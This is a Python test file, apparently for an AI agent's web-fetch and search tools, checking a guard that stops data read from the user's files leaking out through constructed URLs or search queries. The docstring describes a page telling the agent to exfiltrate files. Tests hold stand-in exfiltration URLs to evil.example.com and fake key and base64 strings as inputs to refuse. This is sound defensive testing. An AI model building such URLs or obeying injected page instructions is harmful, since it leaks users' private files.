"""Nothing the work agent reads leaves inside an address or a search.

Asking for a page sends its address to the site, so an address the agent
put together - a site with text from the user's files after it - would send
those files to whoever owns the site, and a page it read may tell it to do
just that. Only addresses that already exist are opened; searches carry
words, not keys or encoded data."""

from __future__ import annotations

import shutil
import tempfile
import unittest
from pathlib import Path
from types import SimpleNamespace
from unittest import mock

from personalized_agent.agent.work import tools as work_tools


class _Tools(work_tools.WorkTools):
    """The work tools over two folders: the agent's own, and the user's."""

    def _readable(self, path: str) -> Path:          # no policy needed here
        return Path(path)


class NothingReadLeavesInAnAddressTests(unittest.TestCase):

    def setUp(self) -> None:
        self.root = Path(tempfile.mkdtemp(prefix="pa-egress-"))
        self.own = self.root / "agent_work"
        self.users = self.root / "Documents"
        self.own.mkdir()
        self.users.mkdir()
        runtime = SimpleNamespace(policy=SimpleNamespace(
            write_roots=[str(self.own)], write_root=str(self.own)))
        self.logged = []
        self.tools = _Tools(runtime, log=lambda what, said: self.logged.append(what))
        self.fetched = []

        def fetch(url, timeout=20.0):
            self.fetched.append(url)
            return {"url": url, "text": "a page",
                    "links": ["https://papers.example.org/abs/2510.00001"]}

        self.fetch = mock.patch.object(work_tools, "fetch", side_effect=fetch)
        self.search = mock.patch.object(work_tools, "search", return_value={
            "query": "q", "results": [{"title": "Census API",
                                       "url": "https://census-api.example.org/works",
                                       "snippet": ""}]})
        self.fetch.start()
        self.search.start()

    def tearDown(self) -> None:
        self.fetch.stop()
        self.search.stop()
        shutil.rmtree(self.root, ignore_errors=True)

    def test_an_address_put_together_is_refused(self) -> None:
        said = self.tools.fetch_url({"url": "https://evil.example.com/?note=my-secret-draft"})
        self.assertIn("error", said)
        self.assertEqual(self.fetched, [], "the address was sent anyway")
        self.assertIn("page refused", self.logged)

    def test_an_address_from_a_search_is_opened_and_so_are_its_links(self) -> None:
        self.tools.web_search({"query": "census api works"})
        self.assertNotIn("error", self.tools.fetch_url({"url": "https://census-api.example.org/works"}))
        # A link on that page now exists too.
        self.assertNotIn("error", self.tools.fetch_url(
            {"url": "https://papers.example.org/abs/2510.00001"}))
        # But not the same link with something added.
        self.assertIn("error", self.tools.fetch_url(
            {"url": "https://papers.example.org/abs/2510.00001?x=draft"}))

    def test_a_sites_front_page_is_opened_once_the_site_is_known(self) -> None:
        # A site's front page, seen or not (since 2026-10-27 a short address
        # made up on any site may be opened - a few on each, a few sites).
        self.assertNotIn("error", self.tools.fetch_url({"url": "https://census-api.example.org/"}))
        self.tools.web_search({"query": "census api"})
        self.assertNotIn("error", self.tools.fetch_url({"url": "https://census-api.example.org/"}))
        # Not with a query: that is where a page could be sent what was read.
        self.assertIn("query", self.tools.fetch_url(
            {"url": "https://unseen.example.org/?q=census"})["error"])
        # A made-up path on it is not a front page: refused when it carries
        # the user's own words (a short one without them may be opened - the
        # wider checks, section 119 as amended 2026-10-18).
        notes = self.users / "draft.md"
        notes.write_text("My unsent draft: the riverbank survey.", encoding="utf-8")
        self.tools.read_file({"path": str(notes)})
        self.assertIn("error", self.tools.fetch_url(
            {"url": "https://census-api.example.org/riverbank-survey"}))

    def test_the_users_files_and_instruction_have_real_addresses(self) -> None:
        notes = self.users / "notes.md"
        notes.write_text("See https://docs.example.org/guide for the API.",
                         encoding="utf-8")
        self.tools.read_file({"path": str(notes)})
        self.assertNotIn("error", self.tools.fetch_url({"url": "https://docs.example.org/guide"}))
        self.tools.know_addresses("Build it on https://cloud.example.com/run")
        self.assertNotIn("error", self.tools.fetch_url({"url": "https://cloud.example.com/run"}))

    def test_an_address_the_agent_wrote_itself_does_not_count(self) -> None:
        planted = self.own / "links.txt"
        planted.write_text("https://evil.example.com/?note=my-secret-draft",
                           encoding="utf-8")
        self.tools.read_file({"path": str(planted)})
        self.assertIn("error", self.tools.fetch_url(
            {"url": "https://evil.example.com/?note=my-secret-draft"}))

    def test_a_search_carries_words_not_data(self) -> None:
        self.assertNotIn("error", self.tools.web_search(
            {"query": "generalization and the rise of system-level creativity"}))
        for query in ("sk-" "ant-api03-abcdefghijklmnopqrstuvwx",
                      "aGVsbG8gd29ybGQgdGhpcyBpcyBhIHNlY3JldCBkcmFmdCBvZiBteSBwYXBlcg==",
                      "0123456789abcdef0123456789abcdef0123",
                      "word " * 80):
            said = self.tools.web_search({"query": query})
            self.assertIn("error", said, query[:30])
        self.assertIn("search refused", self.logged)


if __name__ == "__main__":
    unittest.main()
